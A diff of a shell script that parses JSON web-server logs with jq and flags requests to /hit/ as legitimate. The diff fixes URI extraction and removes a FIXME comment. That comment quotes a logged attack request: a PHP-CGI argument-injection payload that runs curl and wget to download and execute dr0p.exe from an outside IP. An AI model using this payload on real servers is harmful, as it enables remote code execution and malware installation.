@@ -58,14 +58,10 @@ create_db
 
 INSERT_STMT+=("BEGIN TRANSACTION;\n")
 INSERT_DATE=$(date +%s) # Seconds since epoch.
-# FIXME:
-# Error: near line 389: near "curl": syntax error
-#    389  {"time_iso8601": "2025-01-08T14:03:32+00:00", "status": 301, "request_method": "GET", "request_time": "0.000", "remote_addr": "87.120.125.13", "host": "174.138.64.31", "scheme": "http", "request_uri": "/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20exec('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>", "uri": "/cgi-bin/php-cgi.exe", "query_string": "arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20exec('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>", "bytes_sent": 623, "body_bytes_sent": 162, "content_length": "", "request_length": 365, "content_type": "", "http_referer": "", "http_user_agent": "Go-http-client/1.1", "http_x_forwarded_for": "" }
-# Do we need to normalize URIs?
 for LINE in "${LOG_LINES[@]}"; do
   legit=0 # False
-  if request_uri=$(jq -e '.request_uri' <<< "${LINE}" > /dev/null 2>&1); then
-    # FIXME: This doesn't seem to be matching.
+  # Extract the request URI (-r/--raw-output means no literal quotes)
+  if request_uri=$(jq -er '.request_uri' <<< "${LINE}" 2>/dev/null); then
     if [[ "${request_uri}" =~ ^/hit/ ]]; then
       legit=1 # True
     fi
